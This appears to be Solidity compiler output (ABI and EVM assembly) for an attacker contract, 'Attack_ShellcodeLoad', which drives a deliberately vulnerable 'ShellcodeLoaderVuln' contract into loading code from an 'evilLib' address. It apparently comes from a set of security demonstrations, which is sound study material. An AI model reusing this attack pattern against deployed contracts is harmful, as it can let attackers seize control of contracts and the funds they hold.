{
	"S/Shell/Shell.sol": {
		"Attack_ShellcodeLoad": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract ShellcodeLoaderVuln",
							"name": "_t",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "_evilLib",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "evilLib",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "bytes",
							"name": "data",
							"type": "bytes"
						}
					],
					"name": "hack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "target",
					"outputs": [
						{
							"internalType": "contract ShellcodeLoaderVuln",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"S/Shell/Shell.sol\":5346:5698  contract Attack_ShellcodeLoad {... */\n  mstore(0x40, 0x80)\n    /* \"S/Shell/Shell.sol\":5466:5577  constructor(ShellcodeLoaderVuln _t, address _evilLib) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"S/Shell/Shell.sol\":5540:5542  _t */\n  dup2\n    /* \"S/Shell/Shell.sol\":5530:5536  target */\n  0x00\n  dup1\n    /* \"S/Shell/Shell.sol\":5530:5542  target  = _t */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"S/Shell/Shell.sol\":5562:5570  _evilLib */\n  dup1\n    /* \"S/Shell/Shell.sol\":5552:5559  evilLib */\n  0x01\n  0x00\n    /* \"S/Shell/Shell.sol\":5552:5570  evilLib = _evilLib */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"S/Shell/Shell.sol\":5466:5577  constructor(ShellcodeLoaderVuln _t, address _evilLib) {... */\n  pop\n  pop\n    /* \"S/Shell/Shell.sol\":5346:5698  contract Attack_ShellcodeLoad {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_23\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:691   */\ntag_12:\n    /* \"#utility.yul\":632:639   */\n  0x00\n    /* \"#utility.yul\":661:685   */\n  tag_25\n    /* \"#utility.yul\":679:684   */\n  dup3\n    /* \"#utility.yul\":661:685   */\n  tag_11\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":650:685   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:691   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":697:873   */\ntag_13:\n    /* \"#utility.yul\":797:848   */\n  tag_27\n    /* \"#utility.yul\":842:847   */\n  dup2\n    /* \"#utility.yul\":797:848   */\n  tag_12\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":790:795   */\n  dup2\n    /* \"#utility.yul\":787:849   */\n  eq\n    /* \"#utility.yul\":777:867   */\n  tag_28\n  jumpi\n    /* \"#utility.yul\":863:864   */\n  0x00\n    /* \"#utility.yul\":860:861   */\n  dup1\n    /* \"#utility.yul\":853:865   */\n  revert\n    /* \"#utility.yul\":777:867   */\ntag_28:\n    /* \"#utility.yul\":697:873   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":879:1076   */\ntag_14:\n    /* \"#utility.yul\":963:968   */\n  0x00\n    /* \"#utility.yul\":994:1000   */\n  dup2\n    /* \"#utility.yul\":988:1001   */\n  mload\n    /* \"#utility.yul\":979:1001   */\n  swap1\n  pop\n    /* \"#utility.yul\":1010:1070   */\n  tag_30\n    /* \"#utility.yul\":1064:1069   */\n  dup2\n    /* \"#utility.yul\":1010:1070   */\n  tag_13\n  jump\t// in\ntag_30:\n    /* \"#utility.yul\":879:1076   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1082:1204   */\ntag_15:\n    /* \"#utility.yul\":1155:1179   */\n  tag_32\n    /* \"#utility.yul\":1173:1178   */\n  dup2\n    /* \"#utility.yul\":1155:1179   */\n  tag_11\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1148:1153   */\n  dup2\n    /* \"#utility.yul\":1145:1180   */\n  eq\n    /* \"#utility.yul\":1135:1198   */\n  tag_33\n  jumpi\n    /* \"#utility.yul\":1194:1195   */\n  0x00\n    /* \"#utility.yul\":1191:1192   */\n  dup1\n    /* \"#utility.yul\":1184:1196   */\n  revert\n    /* \"#utility.yul\":1135:1198   */\ntag_33:\n    /* \"#utility.yul\":1082:1204   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1210:1353   */\ntag_16:\n    /* \"#utility.yul\":1267:1272   */\n  0x00\n    /* \"#utility.yul\":1298:1304   */\n  dup2\n    /* \"#utility.yul\":1292:1305   */\n  mload\n    /* \"#utility.yul\":1283:1305   */\n  swap1\n  pop\n    /* \"#utility.yul\":1314:1347   */\n  tag_35\n    /* \"#utility.yul\":1341:1346   */\n  dup2\n    /* \"#utility.yul\":1314:1347   */\n  tag_15\n  jump\t// in\ntag_35:\n    /* \"#utility.yul\":1210:1353   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1359:1920   */\ntag_3:\n    /* \"#utility.yul\":1465:1471   */\n  0x00\n    /* \"#utility.yul\":1473:1479   */\n  dup1\n    /* \"#utility.yul\":1522:1524   */\n  0x40\n    /* \"#utility.yul\":1510:1519   */\n  dup4\n    /* \"#utility.yul\":1501:1508   */\n  dup6\n    /* \"#utility.yul\":1497:1520   */\n  sub\n    /* \"#utility.yul\":1493:1525   */\n  slt\n    /* \"#utility.yul\":1490:1609   */\n  iszero\n  tag_37\n  jumpi\n    /* \"#utility.yul\":1528:1607   */\n  tag_38\n  tag_8\n  jump\t// in\ntag_38:\n    /* \"#utility.yul\":1490:1609   */\ntag_37:\n    /* \"#utility.yul\":1648:1649   */\n  0x00\n    /* \"#utility.yul\":1673:1764   */\n  tag_39\n    /* \"#utility.yul\":1756:1763   */\n  dup6\n    /* \"#utility.yul\":1747:1753   */\n  dup3\n    /* \"#utility.yul\":1736:1745   */\n  dup7\n    /* \"#utility.yul\":1732:1754   */\n  add\n    /* \"#utility.yul\":1673:1764   */\n  tag_14\n  jump\t// in\ntag_39:\n    /* \"#utility.yul\":1663:1764   */\n  swap3\n  pop\n    /* \"#utility.yul\":1619:1774   */\n  pop\n    /* \"#utility.yul\":1813:1815   */\n  0x20\n    /* \"#utility.yul\":1839:1903   */\n  tag_40\n    /* \"#utility.yul\":1895:1902   */\n  dup6\n    /* \"#utility.yul\":1886:1892   */\n  dup3\n    /* \"#utility.yul\":1875:1884   */\n  dup7\n    /* \"#utility.yul\":1871:1893   */\n  add\n    /* \"#utility.yul\":1839:1903   */\n  tag_16\n  jump\t// in\ntag_40:\n    /* \"#utility.yul\":1829:1903   */\n  swap2\n  pop\n    /* \"#utility.yul\":1784:1913   */\n  pop\n    /* \"#utility.yul\":1359:1920   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"S/Shell/Shell.sol\":5346:5698  contract Attack_ShellcodeLoad {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"S/Shell/Shell.sol\":5346:5698  contract Attack_ShellcodeLoad {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x7ee2bd87\n      eq\n      tag_2\n      jumpi\n      dup1\n      0xb4e372d4\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd4b83992\n      eq\n      tag_4\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"S/Shell/Shell.sol\":5421:5459  address                 public evilLib */\n    tag_2:\n      callvalue\n      dup1\n      iszero\n      tag_5\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_5:\n      pop\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"S/Shell/Shell.sol\":5583:5696  function hack(bytes calldata data) external payable {... */\n    tag_3:\n      tag_10\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      tag_13\n      jump\t// in\n    tag_10:\n      stop\n        /* \"S/Shell/Shell.sol\":5382:5415  ShellcodeLoaderVuln public target */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"S/Shell/Shell.sol\":5421:5459  address                 public evilLib */\n    tag_7:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"S/Shell/Shell.sol\":5583:5696  function hack(bytes calldata data) external payable {... */\n    tag_13:\n        /* \"S/Shell/Shell.sol\":5645:5651  target */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"S/Shell/Shell.sol\":5645:5656  target.load */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xc40a8f62\n        /* \"S/Shell/Shell.sol\":5664:5673  msg.value */\n      callvalue\n        /* \"S/Shell/Shell.sol\":5675:5682  evilLib */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"S/Shell/Shell.sol\":5684:5688  data */\n      dup6\n      dup6\n        /* \"S/Shell/Shell.sol\":5645:5689  target.load{value: msg.value}(evilLib, data) */\n      mload(0x40)\n      dup6\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_20\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x00\n      dup3\n      returndatacopy\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_24\n      swap2\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      pop\n        /* \"S/Shell/Shell.sol\":5583:5696  function hack(bytes calldata data) external payable {... */\n      pop\n      pop\n      jump\t// out\n        /* \"S/Shell/Shell.sol\":5382:5415  ShellcodeLoaderVuln public target */\n    tag_16:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_26:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_27:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_56\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_26\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_28:\n        /* \"#utility.yul\":328:352   */\n      tag_58\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_27\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_9:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_60\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_28\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":593:668   */\n    tag_29:\n        /* \"#utility.yul\":626:632   */\n      0x00\n        /* \"#utility.yul\":659:661   */\n      0x40\n        /* \"#utility.yul\":653:662   */\n      mload\n        /* \"#utility.yul\":643:662   */\n      swap1\n      pop\n        /* \"#utility.yul\":593:668   */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":674:791   */\n    tag_30:\n        /* \"#utility.yul\":783:784   */\n      0x00\n        /* \"#utility.yul\":780:781   */\n      dup1\n        /* \"#utility.yul\":773:785   */\n      revert\n        /* \"#utility.yul\":797:914   */\n    tag_31:\n        /* \"#utility.yul\":906:907   */\n      0x00\n        /* \"#utility.yul\":903:904   */\n      dup1\n        /* \"#utility.yul\":896:908   */\n      revert\n        /* \"#utility.yul\":920:1037   */\n    tag_32:\n        /* \"#utility.yul\":1029:1030   */\n      0x00\n        /* \"#utility.yul\":1026:1027   */\n      dup1\n        /* \"#utility.yul\":1019:1031   */\n      revert\n        /* \"#utility.yul\":1043:1160   */\n    tag_33:\n        /* \"#utility.yul\":1152:1153   */\n      0x00\n        /* \"#utility.yul\":1149:1150   */\n      dup1\n        /* \"#utility.yul\":1142:1154   */\n      revert\n        /* \"#utility.yul\":1166:1283   */\n    tag_34:\n        /* \"#utility.yul\":1275:1276   */\n      0x00\n        /* \"#utility.yul\":1272:1273   */\n      dup1\n        /* \"#utility.yul\":1265:1277   */\n      revert\n        /* \"#utility.yul\":1302:1854   */\n    tag_35:\n        /* \"#utility.yul\":1359:1367   */\n      0x00\n        /* \"#utility.yul\":1369:1375   */\n      dup1\n        /* \"#utility.yul\":1419:1422   */\n      dup4\n        /* \"#utility.yul\":1412:1416   */\n      0x1f\n        /* \"#utility.yul\":1404:1410   */\n      dup5\n        /* \"#utility.yul\":1400:1417   */\n      add\n        /* \"#utility.yul\":1396:1423   */\n      slt\n        /* \"#utility.yul\":1386:1508   */\n      tag_68\n      jumpi\n        /* \"#utility.yul\":1427:1506   */\n      tag_69\n      tag_32\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":1386:1508   */\n    tag_68:\n        /* \"#utility.yul\":1540:1546   */\n      dup3\n        /* \"#utility.yul\":1527:1547   */\n      calldataload\n        /* \"#utility.yul\":1517:1547   */\n      swap1\n      pop\n        /* \"#utility.yul\":1570:1588   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":1562:1568   */\n      dup2\n        /* \"#utility.yul\":1559:1589   */\n      gt\n        /* \"#utility.yul\":1556:1673   */\n      iszero\n      tag_70\n      jumpi\n        /* \"#utility.yul\":1592:1671   */\n      tag_71\n      tag_33\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":1556:1673   */\n    tag_70:\n        /* \"#utility.yul\":1706:1710   */\n      0x20\n        /* \"#utility.yul\":1698:1704   */\n      dup4\n        /* \"#utility.yul\":1694:1711   */\n      add\n        /* \"#utility.yul\":1682:1711   */\n      swap2\n      pop\n        /* \"#utility.yul\":1760:1763   */\n      dup4\n        /* \"#utility.yul\":1752:1756   */\n      0x01\n        /* \"#utility.yul\":1744:1750   */\n      dup3\n        /* \"#utility.yul\":1740:1757   */\n      mul\n        /* \"#utility.yul\":1730:1738   */\n      dup4\n        /* \"#utility.yul\":1726:1758   */\n      add\n        /* \"#utility.yul\":1723:1764   */\n      gt\n        /* \"#utility.yul\":1720:1848   */\n      iszero\n      tag_72\n      jumpi\n        /* \"#utility.yul\":1767:1846   */\n      tag_73\n      tag_34\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":1720:1848   */\n    tag_72:\n        /* \"#utility.yul\":1302:1854   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1860:2387   */\n    tag_12:\n        /* \"#utility.yul\":1930:1936   */\n      0x00\n        /* \"#utility.yul\":1938:1944   */\n      dup1\n        /* \"#utility.yul\":1987:1989   */\n      0x20\n        /* \"#utility.yul\":1975:1984   */\n      dup4\n        /* \"#utility.yul\":1966:1973   */\n      dup6\n        /* \"#utility.yul\":1962:1985   */\n      sub\n        /* \"#utility.yul\":1958:1990   */\n      slt\n        /* \"#utility.yul\":1955:2074   */\n      iszero\n      tag_75\n      jumpi\n        /* \"#utility.yul\":1993:2072   */\n      tag_76\n      tag_30\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":1955:2074   */\n    tag_75:\n        /* \"#utility.yul\":2141:2142   */\n      0x00\n        /* \"#utility.yul\":2130:2139   */\n      dup4\n        /* \"#utility.yul\":2126:2143   */\n      add\n        /* \"#utility.yul\":2113:2144   */\n      calldataload\n        /* \"#utility.yul\":2171:2189   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":2163:2169   */\n      dup2\n        /* \"#utility.yul\":2160:2190   */\n      gt\n        /* \"#utility.yul\":2157:2274   */\n      iszero\n      tag_77\n      jumpi\n        /* \"#utility.yul\":2193:2272   */\n      tag_78\n      tag_31\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":2157:2274   */\n    tag_77:\n        /* \"#utility.yul\":2306:2370   */\n      tag_79\n        /* \"#utility.yul\":2362:2369   */\n      dup6\n        /* \"#utility.yul\":2353:2359   */\n      dup3\n        /* \"#utility.yul\":2342:2351   */\n      dup7\n        /* \"#utility.yul\":2338:2360   */\n      add\n        /* \"#utility.yul\":2306:2370   */\n      tag_35\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":2288:2370   */\n      swap3\n      pop\n      swap3\n      pop\n        /* \"#utility.yul\":2084:2380   */\n      pop\n        /* \"#utility.yul\":1860:2387   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2393:2453   */\n    tag_36:\n        /* \"#utility.yul\":2421:2424   */\n      0x00\n        /* \"#utility.yul\":2442:2447   */\n      dup2\n        /* \"#utility.yul\":2435:2447   */\n      swap1\n      pop\n        /* \"#utility.yul\":2393:2453   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2459:2601   */\n    tag_37:\n        /* \"#utility.yul\":2509:2518   */\n      0x00\n        /* \"#utility.yul\":2542:2595   */\n      tag_82\n        /* \"#utility.yul\":2560:2594   */\n      tag_83\n        /* \"#utility.yul\":2569:2593   */\n      tag_84\n        /* \"#utility.yul\":2587:2592   */\n      dup5\n        /* \"#utility.yul\":2569:2593   */\n      tag_26\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":2560:2594   */\n      tag_36\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":2542:2595   */\n      tag_26\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":2529:2595   */\n      swap1\n      pop\n        /* \"#utility.yul\":2459:2601   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2607:2733   */\n    tag_38:\n        /* \"#utility.yul\":2657:2666   */\n      0x00\n        /* \"#utility.yul\":2690:2727   */\n      tag_86\n        /* \"#utility.yul\":2721:2726   */\n      dup3\n        /* \"#utility.yul\":2690:2727   */\n      tag_37\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":2677:2727   */\n      swap1\n      pop\n        /* \"#utility.yul\":2607:2733   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2739:2892   */\n    tag_39:\n        /* \"#utility.yul\":2816:2825   */\n      0x00\n        /* \"#utility.yul\":2849:2886   */\n      tag_88\n        /* \"#utility.yul\":2880:2885   */\n      dup3\n        /* \"#utility.yul\":2849:2886   */\n      tag_38\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":2836:2886   */\n      swap1\n      pop\n        /* \"#utility.yul\":2739:2892   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2898:3083   */\n    tag_40:\n        /* \"#utility.yul\":3012:3076   */\n      tag_90\n        /* \"#utility.yul\":3070:3075   */\n      dup2\n        /* \"#utility.yul\":3012:3076   */\n      tag_39\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":3007:3010   */\n      dup3\n        /* \"#utility.yul\":3000:3077   */\n      mstore\n        /* \"#utility.yul\":2898:3083   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3089:3365   */\n    tag_18:\n        /* \"#utility.yul\":3209:3213   */\n      0x00\n        /* \"#utility.yul\":3247:3249   */\n      0x20\n        /* \"#utility.yul\":3236:3245   */\n      dup3\n        /* \"#utility.yul\":3232:3250   */\n      add\n        /* \"#utility.yul\":3224:3250   */\n      swap1\n      pop\n        /* \"#utility.yul\":3260:3358   */\n      tag_92\n        /* \"#utility.yul\":3355:3356   */\n      0x00\n        /* \"#utility.yul\":3344:3353   */\n      dup4\n        /* \"#utility.yul\":3340:3357   */\n      add\n        /* \"#utility.yul\":3331:3337   */\n      dup5\n        /* \"#utility.yul\":3260:3358   */\n      tag_40\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":3089:3365   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3371:3539   */\n    tag_41:\n        /* \"#utility.yul\":3454:3465   */\n      0x00\n        /* \"#utility.yul\":3488:3494   */\n      dup3\n        /* \"#utility.yul\":3483:3486   */\n      dup3\n        /* \"#utility.yul\":3476:3495   */\n      mstore\n        /* \"#utility.yul\":3528:3532   */\n      0x20\n        /* \"#utility.yul\":3523:3526   */\n      dup3\n        /* \"#utility.yul\":3519:3533   */\n      add\n        /* \"#utility.yul\":3504:3533   */\n      swap1\n      pop\n        /* \"#utility.yul\":3371:3539   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3545:3693   */\n    tag_42:\n        /* \"#utility.yul\":3643:3649   */\n      dup3\n        /* \"#utility.yul\":3638:3641   */\n      dup2\n        /* \"#utility.yul\":3633:3636   */\n      dup4\n        /* \"#utility.yul\":3620:3650   */\n      calldatacopy\n        /* \"#utility.yul\":3684:3685   */\n      0x00\n        /* \"#utility.yul\":3675:3681   */\n      dup4\n        /* \"#utility.yul\":3670:3673   */\n      dup4\n        /* \"#utility.yul\":3666:3682   */\n      add\n        /* \"#utility.yul\":3659:3686   */\n      mstore\n        /* \"#utility.yul\":3545:3693   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3699:3801   */\n    tag_43:\n        /* \"#utility.yul\":3740:3746   */\n      0x00\n        /* \"#utility.yul\":3791:3793   */\n      0x1f\n        /* \"#utility.yul\":3787:3794   */\n      not\n        /* \"#utility.yul\":3782:3784   */\n      0x1f\n        /* \"#utility.yul\":3775:3780   */\n      dup4\n        /* \"#utility.yul\":3771:3785   */\n      add\n        /* \"#utility.yul\":3767:3795   */\n      and\n        /* \"#utility.yul\":3757:3795   */\n      swap1\n      pop\n        /* \"#utility.yul\":3699:3801   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3829:4143   */\n    tag_44:\n        /* \"#utility.yul\":3925:3928   */\n      0x00\n        /* \"#utility.yul\":3946:4016   */\n      tag_97\n        /* \"#utility.yul\":4009:4015   */\n      dup4\n        /* \"#utility.yul\":4004:4007   */\n      dup6\n        /* \"#utility.yul\":3946:4016   */\n      tag_41\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":3939:4016   */\n      swap4\n      pop\n        /* \"#utility.yul\":4026:4082   */\n      tag_98\n        /* \"#utility.yul\":4075:4081   */\n      dup4\n        /* \"#utility.yul\":4070:4073   */\n      dup6\n        /* \"#utility.yul\":4063:4068   */\n      dup5\n        /* \"#utility.yul\":4026:4082   */\n      tag_42\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":4107:4136   */\n      tag_99\n        /* \"#utility.yul\":4129:4135   */\n      dup4\n        /* \"#utility.yul\":4107:4136   */\n      tag_43\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":4102:4105   */\n      dup5\n        /* \"#utility.yul\":4098:4137   */\n      add\n        /* \"#utility.yul\":4091:4137   */\n      swap1\n      pop\n        /* \"#utility.yul\":3829:4143   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4149:4588   */\n    tag_21:\n        /* \"#utility.yul\":4298:4302   */\n      0x00\n        /* \"#utility.yul\":4336:4338   */\n      0x40\n        /* \"#utility.yul\":4325:4334   */\n      dup3\n        /* \"#utility.yul\":4321:4339   */\n      add\n        /* \"#utility.yul\":4313:4339   */\n      swap1\n      pop\n        /* \"#utility.yul\":4349:4420   */\n      tag_101\n        /* \"#utility.yul\":4417:4418   */\n      0x00\n        /* \"#utility.yul\":4406:4415   */\n      dup4\n        /* \"#utility.yul\":4402:4419   */\n      add\n        /* \"#utility.yul\":4393:4399   */\n      dup7\n        /* \"#utility.yul\":4349:4420   */\n      tag_28\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":4467:4476   */\n      dup2\n        /* \"#utility.yul\":4461:4465   */\n      dup2\n        /* \"#utility.yul\":4457:4477   */\n      sub\n        /* \"#utility.yul\":4452:4454   */\n      0x20\n        /* \"#utility.yul\":4441:4450   */\n      dup4\n        /* \"#utility.yul\":4437:4455   */\n      add\n        /* \"#utility.yul\":4430:4478   */\n      mstore\n        /* \"#utility.yul\":4495:4581   */\n      tag_102\n        /* \"#utility.yul\":4576:4580   */\n      dup2\n        /* \"#utility.yul\":4567:4573   */\n      dup5\n        /* \"#utility.yul\":4559:4565   */\n      dup7\n        /* \"#utility.yul\":4495:4581   */\n      tag_44\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":4487:4581   */\n      swap1\n      pop\n        /* \"#utility.yul\":4149:4588   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4594:4711   */\n    tag_45:\n        /* \"#utility.yul\":4703:4704   */\n      0x00\n        /* \"#utility.yul\":4700:4701   */\n      dup1\n        /* \"#utility.yul\":4693:4705   */\n      revert\n        /* \"#utility.yul\":4717:4897   */\n    tag_46:\n        /* \"#utility.yul\":4765:4842   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":4762:4763   */\n      0x00\n        /* \"#utility.yul\":4755:4843   */\n      mstore\n        /* \"#utility.yul\":4862:4866   */\n      